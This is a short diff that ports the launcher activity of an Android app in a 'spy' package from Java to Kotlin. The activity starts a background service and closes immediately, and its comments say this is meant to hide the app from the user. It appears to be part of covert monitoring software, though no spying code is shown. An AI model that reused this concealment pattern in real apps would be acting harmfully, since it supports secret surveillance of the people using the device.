@@ -1,16 +1,15 @@
-package com.gauravhanna.spy;
+package com.gauravhanna.spy
 
-import android.content.Intent;
-import android.os.Bundle;
-import androidx.appcompat.app.AppCompatActivity;
+import android.content.Intent
+import android.os.Bundle
+import androidx.appcompat.app.AppCompatActivity
 
-public class MainActivity extends AppCompatActivity {
-    @Override
-    protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
+class MainActivity : AppCompatActivity() {
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
         // Start background service
-        startService(new Intent(this, BackgroundService.class));
-        // Hide app icon - remove from recents and finish
-        finish();
+        startService(Intent(this, BackgroundService::class.java))
+        // Immediately finish (hide the app)
+        finish()
     }
 }
